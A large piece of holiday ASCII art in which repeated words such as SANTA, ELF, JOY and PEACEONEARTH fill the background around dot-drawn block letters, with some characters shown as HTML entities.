ELFJOYELFCHRISTMASf...............................]PEACEONEARTHNORTHPOLEJOY
ELFHOHOHOSANTAELFQh...............................]GOODWILLTOWARDSMENHOHOHO
SANTACHRISTMASELFQQ,..............................]PEACEONEARTHPEACEONEARTH
GOODWILLTOWARDSMENQL..............................]HOHOHOELFCHRISTMASSANTAQ
GOODWILLTOWARDSMENQQ,.............................]PEACEONEARTHELFHOHOHOJOY
NORTHPOLESANTAHOHOHOm.............................]HOHOHOGOODWILLTOWARDSMEN
PEACEONEARTHCHRISTMASg............................]ELFHOHOHOSANTANORTHPOLEQ
NORTHPOLECHRISTMASJOYQm,..........................]NORTHPOLECHRISTMASSANTAQ
SANTASANTACHRISTMASSANTAw,........................]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENHOHOHOWQga,,....................]PEACEONEARTHPEACEONEARTH
PEACEONEARTHJOYCHRISTMASELFWCHRISTMASGOODWILLTOWARDSMENJOYPEACEONEARTHSANTA
PEACEONEARTHPEACEONEARTHCHRISTMASJOYSANTAPEACEONEARTHCHRISTMASELFHOHOHOELFQ
GOODWILLTOWARDSMENNORTHPOLECHRISTMASPEACEONEARTHHOHOHOELFJOYNORTHPOLEELFELF
JOYGOODWILLTOWARDSMENSANTACHRISTMASJOYPEACEONEARTHHOHOHOELFCHRISTMASHOHOHOQ
HOHOHOCHRISTMASHOHOHOSANTANORTHPOLEPEACEONEARTHJOYPEACEONEARTHJOYJOYHOHOHOQ
JOYELFGOODWILLTOWARDSMENSANTAQBTT???TT$SANTASANTAPEACEONEARTHNORTHPOLEJOYQQ
SANTACHRISTMASCHRISTMASJOYWP&amp;quot;`.........-&amp;quot;9NORTHPOLEPEACEONEARTHCHRISTMASELF
SANTAELFELFELFSANTAJOYQQWP`...............-4JOYSANTANORTHPOLEJOYSANTASANTAQ
ELFELFELFHOHOHOHOHOHOQQ&amp;#64;'...................&amp;quot;$CHRISTMASELFSANTANORTHPOLEELF
ELFCHRISTMASSANTAELFQQP`.....................-$WELFWPEACEONEARTHSANTASANTAQ
SANTANORTHPOLEJOYELFQE........................-$SANTAELFWGOODWILLTOWARDSMEN
NORTHPOLEELFELFELFQQ&amp;#64;`.........................-QWPEACEONEARTHPEACEONEARTHQ
PEACEONEARTHJOYJOYQQ(...........................]CHRISTMASHOHOHOELFSANTAJOY
HOHOHOCHRISTMASELFQP.............................$NORTHPOLEJOYQWJOYWJOYWELF
SANTACHRISTMASJOYQQ(.............................]WSANTAWPEACEONEARTHJOYELF
HOHOHOSANTAJOYELFQW............_aaaas,............QWCHRISTMASQWHOHOHOSANTAQ
SANTAPEACEONEARTHQf........._wELFWWWWQQw,.........3ELFHOHOHOJOYJOYSANTAELFQ
CHRISTMASSANTAELFQ[........&amp;lt;HOHOHOELFELFQc........]CHRISTMASPEACEONEARTHELF
CHRISTMASCHRISTMAS(......._PEACEONEARTHJOY/.......)NORTHPOLESANTAELFQWELFWQ
PEACEONEARTHSANTAQ`.......dNORTHPOLEHOHOHOm.......:NORTHPOLEWCHRISTMASJOYQQ
PEACEONEARTHELFELF........SANTANORTHPOLEJOY;.......SANTASANTAJOYQWSANTAJOYQ
PEACEONEARTHSANTAQ.......]ELFSANTAJOYJOYELF[.......GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMEN.......]ELFNORTHPOLEJOYQQf.......ELFSANTAJOYHOHOHOQQWELFQ
GOODWILLTOWARDSMEN.......]ELF.......]JOYELF[.......PEACEONEARTHPEACEONEARTH
HOHOHOJOYNORTHPOLE.......]JOY.......]SANTAQ'.......SANTASANTAQQWNORTHPOLEQQ
CHRISTMASNORTHPOLE:......)WQQ.......]SANTAD........NORTHPOLESANTAELFWELFJOY
ELFCHRISTMASSANTAQ;......-JOY.......]ELFQW'.......:PEACEONEARTHCHRISTMASJOY
CHRISTMASSANTAELFQ[.......WQQ.......]ELFD'........=HOHOHOGOODWILLTOWARDSMEN
ELFELFSANTAJOYELFQL.......]QQ.......]ELF..........]PEACEONEARTHQWCHRISTMASQ
NORTHPOLESANTAELFQm.......+QQ.......]ELF;.........jWNORTHPOLENORTHPOLEELFWQ
JOYELFHOHOHOSANTAQQ.................]JOY[.........mCHRISTMASCHRISTMASQQWELF
NORTHPOLENORTHPOLEQ[................]JOYL........_PEACEONEARTHSANTASANTAELF
SANTANORTHPOLEJOYQQm................]ELFk........dHOHOHOPEACEONEARTHQQWJOYQ
PEACEONEARTHHOHOHOQQc...............]JOYm.......]PEACEONEARTHHOHOHOWHOHOHOQ
CHRISTMASHOHOHOJOYQQm...............]ELFQ......_GOODWILLTOWARDSMENNORTHPOLE
JOYELFNORTHPOLEJOYELFL..............]JOYQ;....&amp;lt;SANTAHOHOHONORTHPOLEELFSANTA
PEACEONEARTHELFHOHOHOQ,.............]JOYQ[...wPEACEONEARTHELFSANTAWHOHOHOQQ
CHRISTMASELFELFELFJOYQ6.............]ELFQL_wPEACEONEARTHHOHOHOCHRISTMASELFQ
HOHOHOJOYNORTHPOLEQWELFwaaaaaaaaaaaajPEACEONEARTHGOODWILLTOWARDSMENSANTAQWQ
CHRISTMASELFPEACEONEARTHWWWQWWQWWWWELFELFSANTANORTHPOLESANTAELFQQWJOYHOHOHO
CHRISTMASNORTHPOLEHOHOHOHOHOHOCHRISTMASGOODWILLTOWARDSMENNORTHPOLEHOHOHOWQQ
GOODWILLTOWARDSMENNORTHPOLENORTHPOLESANTANORTHPOLEJOYSANTAELFELFWCHRISTMASQ
GOODWILLTOWARDSMENHOHOHOHOHOHONORTHPOLEELFSANTAELFNORTHPOLEPEACEONEARTHELFQ
PEACEONEARTHELFELFQWPEACEONEARTHPEACEONEARTHHOHOHOPEACEONEARTHWNORTHPOLEWQQ
ELFPEACEONEARTHCHRISTMASELFPEACEONEARTHJOYNORTHPOLEGOODWILLTOWARDSMENSANTAQ
SANTASANTASANTAJOYELFJOYWGOODWILLTOWARDSMENPEACEONEARTHSANTAWPEACEONEARTHQQ
PEACEONEARTHSANTAJOYGOODWILLTOWARDSMENSANTACHRISTMASELFCHRISTMASELFJOYQWELF
CHRISTMASCHRISTMASELFELFHOHOHOWJOYWNORTHPOLESANTACHRISTMASWSANTAJOYQQWJOYQQ
ELFJOYSANTAJOYJOYQQWJOYWPEACEONEARTHNORTHPOLEHOHOHOHOHOHONORTHPOLEELFJOYELF
ELFNORTHPOLEJOYSANTANORTHPOLECHRISTMASQQWPEACEONEARTHJOYQWHOHOHOJOYWJOYELFQ
NORTHPOLECHRISTMASHOHOHOSANTAWPEACEONEARTHGOODWILLTOWARDSMENCHRISTMASHOHOHO
GOODWILLTOWARDSMENSANTACHRISTMASSANTAQQWELFHOHOHOSANTAQQWJOYSANTAQWSANTAJOY
JOYNORTHPOLEJOYPEACEONEARTHWELFELFQQWNORTHPOLEQWHOHOHONORTHPOLEELFELFHOHOHO
CHRISTMASSANTASANTAWJOYWCHRISTMASHOHOHONORTHPOLEJOYQQWHOHOHOSANTAWNORTHPOLE
PEACEONEARTHSANTASANTAPEACEONEARTHNORTHPOLEJOYJOYJOYELFCHRISTMASHOHOHOSANTA
SANTASANTACHRISTMASJOYJOYJOYELFJOYQWHOHOHOJOYQWPEACEONEARTHELFQQWCHRISTMASQ
GOODWILLTOWARDSMENELFPEACEONEARTHHOHOHOCHRISTMASELFQWHOHOHOWCHRISTMASHOHOHO
CHRISTMASELFELFPEACEONEARTHWELFQQWHOHOHOQQWCHRISTMASELFJOYNORTHPOLEHOHOHOQQ
SANTAPEACEONEARTHQQWJOYWCHRISTMASHOHOHOPEACEONEARTHGOODWILLTOWARDSMENJOYQWQ
JOYJOYHOHOHOELFELFP???????????????????????????????4SANTAQQWPEACEONEARTHELFQ
NORTHPOLENORTHPOLEf...............................]PEACEONEARTHQQWHOHOHOWQQ
CHRISTMASJOYHOHOHOf...............................]ELFGOODWILLTOWARDSMENELF
NORTHPOLEELFELFELFf...............................]PEACEONEARTHHOHOHOQQWELF
NORTHPOLEHOHOHOELFf...............................]CHRISTMASJOYQWSANTASANTA
SANTAJOYNORTHPOLEQf...............................]SANTAHOHOHOWJOYCHRISTMAS
GOODWILLTOWARDSMENf...............................]PEACEONEARTHHOHOHOQWJOYQ
ELFPEACEONEARTHELFf...............................]GOODWILLTOWARDSMENHOHOHO
JOYCHRISTMASELFELFf...............................]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENf...............................]NORTHPOLEPEACEONEARTHJOY
ELFSANTAHOHOHOELFQf.......aaaaaa/....._aaaaa......]GOODWILLTOWARDSMENWELFQQ
NORTHPOLEHOHOHOELFf.......QWWWWQf.....]QQWWQ......]HOHOHOHOHOHOQQWJOYSANTAQ
SANTANORTHPOLEJOYQf.......HOHOHOf.....]JOYQQ......]HOHOHOHOHOHONORTHPOLEELF
NORTHPOLEJOYJOYELFf.......JOYELFf.....]SANTA......]NORTHPOLEHOHOHONORTHPOLE
SANTASANTASANTAELFf.......JOYELFf.....]SANTA......]NORTHPOLENORTHPOLEELFELF
GOODWILLTOWARDSMENf.......JOYJOYf.....]JOYQW......]PEACEONEARTHHOHOHOQWELFQ
GOODWILLTOWARDSMENf.......HOHOHO[.....)JOYQE......]HOHOHOELFHOHOHOQQWJOYJOY
JOYNORTHPOLEELFELFf.......$WELFQ(......$WQQ(......]PEACEONEARTHNORTHPOLEELF
NORTHPOLEJOYELFJOYf.......)ELFQ&amp;#64;........??'.......]CHRISTMASPEACEONEARTHJOY
SANTAPEACEONEARTHQL........?$QV'..................]HOHOHOGOODWILLTOWARDSMEN
JOYELFPEACEONEARTHk...............................jJOYSANTACHRISTMASWJOYJOY
SANTAPEACEONEARTHQW...............................jSANTAGOODWILLTOWARDSMENQ
CHRISTMASSANTAELFQQ...............................HOHOHOPEACEONEARTHSANTAQQ
ELFCHRISTMASELFELFQ;................;............=NORTHPOLENORTHPOLEJOYELFQ
NORTHPOLEJOYSANTAQQ[...............)L............jPEACEONEARTHJOYHOHOHOQQWQ
CHRISTMASHOHOHOJOYQm...............dQ,..........&amp;lt;GOODWILLTOWARDSMENQWSANTAQ
SANTACHRISTMASSANTAQL.............&amp;lt;QQm,........_JOYELFGOODWILLTOWARDSMENELF
HOHOHOSANTASANTAJOYQQc..........._mELFQc......aGOODWILLTOWARDSMENSANTAJOYWQ
CHRISTMASHOHOHOJOYJOYQw........._mELFQQWmwaawGOODWILLTOWARDSMENNORTHPOLEELF
NORTHPOLEELFPEACEONEARTHw,,..__yELFJOYJOYQWQWQWGOODWILLTOWARDSMENCHRISTMASQ
JOYNORTHPOLEELFNORTHPOLEWGOODWILLTOWARDSMENNORTHPOLEJOYJOYJOYSANTAQQWELFWQQ
JOYSANTAELFHOHOHOQQWNORTHPOLENORTHPOLEGOODWILLTOWARDSMENSANTASANTAHOHOHOJOY
ELFHOHOHOCHRISTMASCHRISTMASELFPEACEONEARTHHOHOHOELFCHRISTMASHOHOHOELFJOYELF
JOYPEACEONEARTHJOYNORTHPOLEGOODWILLTOWARDSMENHOHOHONORTHPOLEHOHOHOELFELFJOY
HOHOHOPEACEONEARTHELFJOYJOYQV?&amp;quot;~....--&amp;quot;?$CHRISTMASELFWPEACEONEARTHQWHOHOHOQ
CHRISTMASCHRISTMASJOYELFWW?`.............-?CHRISTMASHOHOHOQWELFWSANTAJOYWQQ
SANTAPEACEONEARTHQQWELFQP`.................-4HOHOHOWCHRISTMASNORTHPOLESANTA
CHRISTMASNORTHPOLEJOYQW(.....................)WGOODWILLTOWARDSMENNORTHPOLEQ
GOODWILLTOWARDSMENJOYW'.......................)WSANTAJOYQQWNORTHPOLEHOHOHOQ
JOYNORTHPOLEHOHOHOJOY(.........................)PEACEONEARTHSANTAELFWJOYWQQ
GOODWILLTOWARDSMENQQf...........................4PEACEONEARTHELFQWCHRISTMAS
NORTHPOLEHOHOHOELFQW`...........................-HOHOHOWCHRISTMASCHRISTMASQ
GOODWILLTOWARDSMENQf.............................]JOYJOYSANTAELFWCHRISTMASQ
HOHOHONORTHPOLEJOYQ`.............................-HOHOHOELFQWCHRISTMASSANTA
ELFELFELFJOYHOHOHOE.........._wwQWQQmga,..........$GOODWILLTOWARDSMENJOYWQQ
NORTHPOLECHRISTMASf........_yJOYWSANTAQQg,........]PEACEONEARTHPEACEONEARTH
SANTANORTHPOLEJOYQ[......._ELFELFSANTAELFQ,.......]CHRISTMASSANTASANTAWJOYQ
CHRISTMASCHRISTMAS;.......dPEACEONEARTHJOYk.......=JOYJOYHOHOHOQWJOYWHOHOHO
ELFNORTHPOLEELFELF......._HOHOHOCHRISTMASQQ,.......NORTHPOLEQWSANTASANTAELF
PEACEONEARTHJOYJOY.......]PEACEONEARTHJOYQQ[.......GOODWILLTOWARDSMENELFJOY
HOHOHOELFNORTHPOLE.......]PEACEONEARTHSANTAf.......NORTHPOLEHOHOHOHOHOHOELF
ELFSANTAELFHOHOHOQ.......]NORTHPOLEHOHOHOQQ[.......GOODWILLTOWARDSMENHOHOHO
CHRISTMASCHRISTMAS.......)PEACEONEARTHJOYQQ(.......HOHOHOHOHOHOSANTAWHOHOHO
SANTASANTAELFJOYQQ........HOHOHOCHRISTMASQ&amp;#64;.......:NORTHPOLEELFQWSANTASANTA
CHRISTMASCHRISTMAS;.......]PEACEONEARTHELF[.......&amp;lt;HOHOHOSANTANORTHPOLEQQWQ
HOHOHOPEACEONEARTH[........4HOHOHOJOYELFQf........]PEACEONEARTHHOHOHOHOHOHO
CHRISTMASCHRISTMASL.........&amp;quot;HWJOYSANTAD^.........jNORTHPOLENORTHPOLEHOHOHO
GOODWILLTOWARDSMENm............&amp;quot;!???!&amp;quot;`...........NORTHPOLEHOHOHOWJOYQWELFQ
CHRISTMASJOYELFELFQ/.............................]WNORTHPOLECHRISTMASHOHOHO
SANTAJOYCHRISTMASQQk.............................dPEACEONEARTHELFELFHOHOHOQ
SANTAPEACEONEARTHJOY/...........................&amp;lt;NORTHPOLECHRISTMASHOHOHOQQ
ELFSANTASANTASANTAQQm...........................mJOYELFSANTAPEACEONEARTHELF
CHRISTMASCHRISTMASELFk.........................jGOODWILLTOWARDSMENQWJOYWELF
ELFJOYCHRISTMASJOYJOYQL.......................jNORTHPOLENORTHPOLEJOYJOYJOYQ
ELFELFJOYSANTAJOYELFELFg,..................._yGOODWILLTOWARDSMENQQWSANTAELF
PEACEONEARTHJOYELFQWSANTAc.................aQWCHRISTMASHOHOHOSANTAJOYHOHOHO
SANTAJOYJOYPEACEONEARTHELFQa,..........._wQWWHOHOHOSANTAJOYELFQQWJOYSANTAQQ
HOHOHOELFJOYPEACEONEARTHQQWJOYmwwaaaawyJOYWCHRISTMASHOHOHOPEACEONEARTHJOYWQ
ELFCHRISTMASSANTASANTASANTAJOYQQWWWWQWGOODWILLTOWARDSMENJOYELFQWCHRISTMASQQ
SANTAHOHOHOELFPEACEONEARTHGOODWILLTOWARDSMENJOYPEACEONEARTHSANTASANTAJOYWQQ
HOHOHOJOYELFJOYELFQWGOODWILLTOWARDSMENPEACEONEARTHGOODWILLTOWARDSMENELFELFQ
NORTHPOLEJOYJOYELFHOHOHOWPEACEONEARTHNORTHPOLECHRISTMASHOHOHOQWELFJOYQQWJOY
GOODWILLTOWARDSMENSANTAJOYNORTHPOLENORTHPOLEHOHOHOHOHOHOGOODWILLTOWARDSMENQ
CHRISTMASJOYSANTANORTHPOLEV?&amp;quot;-....................]GOODWILLTOWARDSMENQWJOYQ
GOODWILLTOWARDSMENSANTAW?`........................]GOODWILLTOWARDSMENSANTAQ
HOHOHOELFJOYJOYELFQWQQD'..........................]HOHOHONORTHPOLEQWHOHOHOQ
PEACEONEARTHHOHOHOJOYP`...........................]SANTAJOYELFWHOHOHOHOHOHO
PEACEONEARTHHOHOHOQQD`............................]JOYPEACEONEARTHSANTAELFQ
PEACEONEARTHHOHOHOQW'.............................]CHRISTMASJOYELFQWHOHOHOQ
ELFPEACEONEARTHELFQf..............................]PEACEONEARTHELFNORTHPOLE
SANTACHRISTMASJOYQQ`..............................]NORTHPOLEQQWNORTHPOLEQWQ
CHRISTMASHOHOHOELFE...............................]SANTAGOODWILLTOWARDSMENQ
GOODWILLTOWARDSMENf...............................]GOODWILLTOWARDSMENSANTAQ
ELFCHRISTMASELFJOY[.........amWNORTHPOLEGOODWILLTOWARDSMENJOYJOYJOYQWELFWQQ
PEACEONEARTHJOYJOY(......._QQWHOHOHOWJOYWPEACEONEARTHPEACEONEARTHNORTHPOLEQ
NORTHPOLEELFELFJOY`.......mSANTAQQWCHRISTMASQQWGOODWILLTOWARDSMENQQWHOHOHOQ
JOYSANTANORTHPOLEQ`......=CHRISTMASPEACEONEARTHSANTANORTHPOLENORTHPOLESANTA
NORTHPOLESANTAJOYQ.......]NORTHPOLEPEACEONEARTHELFHOHOHOGOODWILLTOWARDSMENQ
ELFNORTHPOLESANTAQ.......]GOODWILLTOWARDSMENQWELFJOYPEACEONEARTHCHRISTMASQQ
HOHOHONORTHPOLEJOY.......]GOODWILLTOWARDSMENJOYJOYQWPEACEONEARTHJOYWSANTAWQ
PEACEONEARTHJOYELF.......-QWSANTAELFWSANTAWHOHOHOPEACEONEARTHCHRISTMASELFQQ
CHRISTMASSANTAJOYQ........]SANTASANTASANTAGOODWILLTOWARDSMENPEACEONEARTHELF
ELFHOHOHOCHRISTMAS;........?ELFJOYPEACEONEARTHELFQWGOODWILLTOWARDSMENHOHOHO
GOODWILLTOWARDSMEN[.........-&amp;quot;????????????????????4ELFCHRISTMASHOHOHOQQWELF
SANTASANTAJOYSANTAL...............................]HOHOHOQWJOYELFQQWJOYJOYQ
NORTHPOLECHRISTMASQ...............................]NORTHPOLEELFQWJOYJOYELFQ
SANTANORTHPOLEELFQWc..............................]GOODWILLTOWARDSMENSANTAQ
JOYSANTACHRISTMASQQm..............................]ELFNORTHPOLECHRISTMASELF
CHRISTMASSANTASANTAQL.............................]PEACEONEARTHWJOYJOYQQWQQ
ELFNORTHPOLEHOHOHOJOYc............................]SANTACHRISTMASJOYELFJOYQ
SANTAELFHOHOHOJOYJOYQQc...........................]PEACEONEARTHSANTAQQWJOYQ
GOODWILLTOWARDSMENSANTAw,.........................]NORTHPOLEHOHOHONORTHPOLE
NORTHPOLENORTHPOLEQWSANTAa,.......................]PEACEONEARTHWSANTAWJOYQQ
SANTACHRISTMASHOHOHOELFELFQQgwaaaaaaaaaaaaaaaaaaaajCHRISTMASJOYPEACEONEARTH
SANTAHOHOHOPEACEONEARTHSANTAQWWWWWWWWWWWWWWWWWWWWHOHOHOELFJOYCHRISTMASELFQQ
NORTHPOLESANTASANTANORTHPOLESANTAPEACEONEARTHCHRISTMASELFHOHOHOELFJOYWJOYQQ
JOYELFJOYNORTHPOLEPEACEONEARTHJOYGOODWILLTOWARDSMENPEACEONEARTHELFELFELFELF
SANTAJOYCHRISTMASQQWELFWGOODWILLTOWARDSMENSANTANORTHPOLENORTHPOLEJOYWSANTAQ
JOYPEACEONEARTHSANTAGOODWILLTOWARDSMENJOYPEACEONEARTHJOYELFJOYCHRISTMASJOYQ
PEACEONEARTHJOYHOHOHOJOYHOHOHONORTHPOLEHOHOHOGOODWILLTOWARDSMENPEACEONEARTH
SANTASANTAELFJOYQQP???????????????????????????????4PEACEONEARTHJOYQWSANTAQQ
ELFELFHOHOHOHOHOHOf...............................]GOODWILLTOWARDSMENJOYELF
SANTAJOYELFELFELFQf...............................]CHRISTMASNORTHPOLESANTAQ
SANTAHOHOHOELFJOYQf...............................]GOODWILLTOWARDSMENELFELF
GOODWILLTOWARDSMENf...............................]CHRISTMASCHRISTMASJOYQWQ
JOYSANTAELFJOYELFQf...............................]PEACEONEARTHSANTAWHOHOHO
CHRISTMASCHRISTMASf...............................]GOODWILLTOWARDSMENSANTAQ
PEACEONEARTHSANTAQf...............................]HOHOHOHOHOHOJOYWHOHOHOWQ
JOYELFHOHOHOJOYELFf...............................]GOODWILLTOWARDSMENHOHOHO
SANTANORTHPOLEJOYQf...............................]PEACEONEARTHNORTHPOLEELF
HOHOHOGOODWILLTOWARDSMENSANTAWJOYQ&amp;#64;'.............sPEACEONEARTHELFWCHRISTMAS
GOODWILLTOWARDSMENHOHOHOCHRISTMASF............._yWWPEACEONEARTHELFELFJOYWQQ
SANTAGOODWILLTOWARDSMENQQWELFQQ&amp;#64;'.............sQWGOODWILLTOWARDSMENJOYJOYQQ
NORTHPOLECHRISTMASNORTHPOLEQQWF............._yQWELFELFELFSANTASANTAHOHOHOQQ
NORTHPOLECHRISTMASELFQQWELFQ&amp;#64;'.............aWCHRISTMASELFPEACEONEARTHQQWELF
SANTAHOHOHOHOHOHOJOYWSANTAQ?............._yQWPEACEONEARTHCHRISTMASQQWJOYJOY
CHRISTMASSANTACHRISTMASQQ&amp;#64;'.............aJOYNORTHPOLESANTAELFHOHOHOSANTAELF
SANTACHRISTMASNORTHPOLEW?............._yCHRISTMASCHRISTMASCHRISTMASHOHOHOQQ
PEACEONEARTHHOHOHOQWQQD'.............aHOHOHOHOHOHONORTHPOLEHOHOHOELFWHOHOHO
HOHOHOCHRISTMASELFELF!............._mGOODWILLTOWARDSMENCHRISTMASSANTASANTAQ
JOYPEACEONEARTHELFQD'.............aCHRISTMASPEACEONEARTHSANTAHOHOHOWSANTAQQ
NORTHPOLEJOYHOHOHOF..............&amp;quot;????????????????4PEACEONEARTHQQWHOHOHOELF
HOHOHOELFSANTAELFQf...............................]SANTAQWJOYWNORTHPOLEELFQ
HOHOHOPEACEONEARTHf...............................]PEACEONEARTHPEACEONEARTH
JOYPEACEONEARTHELFf...............................]HOHOHOSANTASANTASANTAELF
GOODWILLTOWARDSMENf...............................]PEACEONEARTHNORTHPOLEJOY
NORTHPOLEHOHOHOELFf...............................]HOHOHOCHRISTMASWSANTAELF
ELFSANTACHRISTMASQf...............................]SANTAJOYJOYQWSANTAJOYWQQ
HOHOHONORTHPOLEJOYf...............................]PEACEONEARTHSANTAHOHOHOQ
GOODWILLTOWARDSMENf...............................]CHRISTMASCHRISTMASSANTAQ
PEACEONEARTHELFJOYf...............................]PEACEONEARTHJOYELFQQWJOY
JOYSANTAPEACEONEARTHSANTAWQQWQQWGOODWILLTOWARDSMENCHRISTMASJOYSANTASANTAJOY
ELFNORTHPOLESANTAELFHOHOHOJOYGOODWILLTOWARDSMENNORTHPOLECHRISTMASQWJOYWELFQ
HOHOHOCHRISTMASSANTAJOYCHRISTMASHOHOHOSANTAELFQQWJOYHOHOHOJOYJOYELFJOYELFQQ
CHRISTMASJOYJOYHOHOHOHOHOHOJOYPEACEONEARTHSANTAELFGOODWILLTOWARDSMENELFELFQ
HOHOHOELFHOHOHOJOYNORTHPOLEHOHOHOCHRISTMASQ???????4GOODWILLTOWARDSMENELFELF
NORTHPOLECHRISTMASQQWELFWELFWPEACEONEARTHQQ.......]HOHOHOCHRISTMASQWELFELFQ
JOYJOYGOODWILLTOWARDSMENSANTAELFQWNORTHPOLE.......]PEACEONEARTHCHRISTMASJOY
JOYELFCHRISTMASELFHOHOHOPEACEONEARTHJOYJOYQ.......]GOODWILLTOWARDSMENHOHOHO
NORTHPOLESANTAELFQQWGOODWILLTOWARDSMENELFQQ.......]CHRISTMASCHRISTMASJOYQWQ
HOHOHOSANTAELFNORTHPOLEPEACEONEARTHELFQWELF.......]SANTAHOHOHOELFSANTAELFQQ
HOHOHOSANTAPEACEONEARTHELFWJOYWSANTAQWELFQQ.......]NORTHPOLENORTHPOLEWELFQQ
SANTAHOHOHOELFELFNORTHPOLENORTHPOLEWELFJOYQ.......]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENHOHOHOWGOODWILLTOWARDSMEN.......]SANTASANTAHOHOHOQWHOHOHO
SANTANORTHPOLESANTAWGOODWILLTOWARDSMENELFQQ.......]CHRISTMASPEACEONEARTHJOY
ELFHOHOHONORTHPOLEP????????????????????????.......]CHRISTMASSANTAQQWJOYELFQ
PEACEONEARTHSANTAQf...............................]ELFHOHOHOSANTAELFJOYELFQ
ELFCHRISTMASELFELFf...............................]GOODWILLTOWARDSMENSANTAQ
PEACEONEARTHHOHOHOf...............................]GOODWILLTOWARDSMENJOYJOY
CHRISTMASNORTHPOLEf...............................]HOHOHONORTHPOLEQWJOYELFQ
ELFPEACEONEARTHELFf...............................]GOODWILLTOWARDSMENSANTAQ
JOYJOYELFSANTAELFQf...............................]SANTANORTHPOLEELFSANTAWQ
JOYHOHOHOSANTAJOYQf...............................]PEACEONEARTHNORTHPOLEELF
SANTAELFELFHOHOHOQf...............................]CHRISTMASPEACEONEARTHELF
HOHOHONORTHPOLEELFf...............................]NORTHPOLEHOHOHOJOYWSANTA
PEACEONEARTHELFJOY6aaaaaaaaaaaaaaaaaaaaaaaa.......]PEACEONEARTHHOHOHOSANTAQ
CHRISTMASELFELFJOYQQWWWWWWWWWWWWWWWWWWWWWQQ.......]NORTHPOLENORTHPOLESANTAQ
NORTHPOLECHRISTMASHOHOHONORTHPOLEHOHOHOJOYQ.......]PEACEONEARTHELFQQWHOHOHO
JOYPEACEONEARTHJOYCHRISTMASPEACEONEARTHELFQ.......]NORTHPOLEJOYPEACEONEARTH
NORTHPOLECHRISTMASPEACEONEARTHHOHOHOSANTAQQ.......]PEACEONEARTHCHRISTMASELF
HOHOHOHOHOHONORTHPOLEELFCHRISTMASHOHOHOELFQ.......]HOHOHONORTHPOLEELFSANTAQ
NORTHPOLEJOYHOHOHOQQWPEACEONEARTHCHRISTMASQ.......]ELFHOHOHOELFSANTAJOYQQWQ
ELFJOYJOYJOYNORTHPOLEJOYPEACEONEARTHSANTAQQ.......]CHRISTMASELFELFQQWHOHOHO
SANTASANTACHRISTMASNORTHPOLENORTHPOLEELFJOY.......]PEACEONEARTHPEACEONEARTH
ELFPEACEONEARTHJOYQWJOYJOYSANTAHOHOHOJOYELF.......]GOODWILLTOWARDSMENJOYQWQ
JOYCHRISTMASJOYCHRISTMASJOYWNORTHPOLEJOYJOYaaaaaaajCHRISTMASPEACEONEARTHJOY
PEACEONEARTHCHRISTMASPEACEONEARTHWELFWSANTAWWWWWWCHRISTMASJOYNORTHPOLEJOYQQ
SANTACHRISTMASSANTAELFJOYQWNORTHPOLEELFSANTAELFQQP]NORTHPOLESANTAJOYWJOYWQQ
ELFJOYCHRISTMASNORTHPOLEWPEACEONEARTHNORTHPOLEQ&amp;#64;^.]HOHOHOHOHOHOELFCHRISTMAS
HOHOHOELFSANTASANTAWNORTHPOLENORTHPOLEJOYQWELFP`..]CHRISTMASPEACEONEARTHJOY
CHRISTMASJOYPEACEONEARTHJOYSANTAQWCHRISTMASQ&amp;#64;&amp;quot;....]JOYGOODWILLTOWARDSMENJOY
GOODWILLTOWARDSMENJOYJOYWHOHOHOHOHOHOQQWELFP`.....]GOODWILLTOWARDSMENELFELF
ELFSANTAHOHOHOGOODWILLTOWARDSMENCHRISTMASW&amp;quot;.......]PEACEONEARTHELFQQWELFWQQ
GOODWILLTOWARDSMENNORTHPOLEPEACEONEARTHQP`........]GOODWILLTOWARDSMENSANTAQ
CHRISTMASHOHOHOELFQWJOYWSANTAJOYWELFQQW&amp;quot;..........]GOODWILLTOWARDSMENELFELF
JOYHOHOHOGOODWILLTOWARDSMENHOHOHOELFQP`...........]NORTHPOLENORTHPOLEHOHOHO
PEACEONEARTHGOODWILLTOWARDSMENWJOYQW&amp;quot;.............]HOHOHOHOHOHONORTHPOLEJOY
ELFPEACEONEARTHJOYCHRISTMASHOHOHOQP`..............]PEACEONEARTHSANTAWELFWQQ
NORTHPOLEHOHOHOJOYELFSANTAQQWJOYW!................yPEACEONEARTHCHRISTMASELF
CHRISTMASELFELFJOYP?????????????`...............sPEACEONEARTHJOYJOYSANTAELF
JOYHOHOHOELFHOHOHOf..........................._mWQWNORTHPOLECHRISTMASHOHOHO
GOODWILLTOWARDSMENf..........................jCHRISTMASNORTHPOLESANTAJOYJOY
NORTHPOLEHOHOHOELFf........................_JOYPEACEONEARTHELFJOYJOYWJOYWQQ
GOODWILLTOWARDSMENf......................_yGOODWILLTOWARDSMENCHRISTMASELFQQ
NORTHPOLENORTHPOLEf.....................:GOODWILLTOWARDSMENSANTASANTAELFJOY
ELFNORTHPOLEJOYJOYf......................-9NORTHPOLEPEACEONEARTHCHRISTMASQQ
NORTHPOLEELFSANTAQf........................?WGOODWILLTOWARDSMENHOHOHOSANTAQ
GOODWILLTOWARDSMENf..........................4WJOYPEACEONEARTHHOHOHOWELFWQQ
PEACEONEARTHSANTAQf...........................-$SANTACHRISTMASHOHOHOELFJOYQ
HOHOHOELFJOYJOYJOY6aaaaaaaaaaaaa,...............?WWPEACEONEARTHPEACEONEARTH
JOYELFHOHOHOJOYSANTAWWWWWWWWWWWQQc...............-4NORTHPOLEHOHOHOQWJOYELFQ
NORTHPOLEGOODWILLTOWARDSMENSANTAWWg,..............]GOODWILLTOWARDSMENSANTAQ
NORTHPOLEHOHOHOELFHOHOHOCHRISTMASELFc.............]HOHOHOELFSANTAWCHRISTMAS
PEACEONEARTHJOYJOYNORTHPOLESANTAJOYWWg,...........]GOODWILLTOWARDSMENJOYQWQ
ELFHOHOHOELFHOHOHOCHRISTMASCHRISTMASJOYc..........]HOHOHOJOYELFQWCHRISTMASQ
PEACEONEARTHSANTAJOYWCHRISTMASJOYSANTAWWw,........]PEACEONEARTHHOHOHOELFELF
CHRISTMASJOYPEACEONEARTHSANTAPEACEONEARTHQc.......]PEACEONEARTHSANTAELFQWQQ
NORTHPOLEPEACEONEARTHJOYNORTHPOLEJOYELFQQWWw......]PEACEONEARTHWHOHOHOJOYQQ
GOODWILLTOWARDSMENQWHOHOHOQWNORTHPOLEELFELFQQ/....]PEACEONEARTHNORTHPOLEJOY
